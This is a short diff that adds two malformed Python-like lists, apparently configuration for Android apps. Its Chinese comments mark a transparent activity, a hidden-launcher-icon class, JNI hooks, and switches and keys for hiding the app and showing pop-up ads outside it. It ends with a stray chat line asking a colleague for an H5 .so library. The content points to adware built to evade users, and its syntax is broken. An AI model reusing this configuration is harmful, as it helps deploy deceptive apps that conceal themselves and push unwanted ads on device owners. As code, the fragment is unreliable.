@@ -1,0 +1,19 @@
+dah['com.majestic.grand.show', 'com.cleanfre.glide.flys',  # 包名
+               'com.majestic.grand.show.GrandPage',# 透明activity
+               'nui/iko/BajuzIko',  #  广播
+               '','gefiles.clean.freshall.StyleClean',  # 隐藏图标 other1","main2
+               'opm/z/cd', '"f"',  # jni路径及函数
+               '/bigo',# 外弹文件开关名
+               '"google"',# 广播接收key
+               '"bigo"',  # 恢复
+               '"freshasg"',  # 隐藏
+               '"ozfresh"']  # 外弹
+
+lia['com.majestic.grand.show', 'com.cleanfre.glide.flys',  # 包名
+                  'opm/z/cd',
+                   '"a"','"b"', '"c"',
+                  'opm/b/FrH',  # hander
+                  'opm/z/A8zi',  # wvcClass WebViewClient
+                  'opm/b/BzC',  # WccClass WebChormeClient
+                  '/bigo']#文件开关
+钟哥，给一下H5的So呢，包名：com.cleanfre.glide.flys
